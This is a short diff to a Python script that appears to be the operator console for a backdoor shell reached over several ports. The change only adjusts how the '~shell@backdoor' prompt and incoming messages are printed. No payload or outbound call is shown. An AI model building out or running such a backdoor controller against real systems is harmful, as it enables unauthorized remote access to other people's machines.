@@ -51,9 +51,15 @@ def main():
                     break
                 msg = data.decode(errors="ignore").rstrip()
                 if active_port == port:
-                    print(msg)
+                    if msg == "~shell@backdoor ":
+                        print(msg, end="")
+                    else:
+                        print(msg)
                 else:
-                    print(f"[{port}] {msg}")
+                    if msg == "~shell@backdoor ":
+                       print(msg, end="")
+                    else:
+                        print(msg)
             except:
                 break
         print(f"\n[-] Disconnected from port {port}")
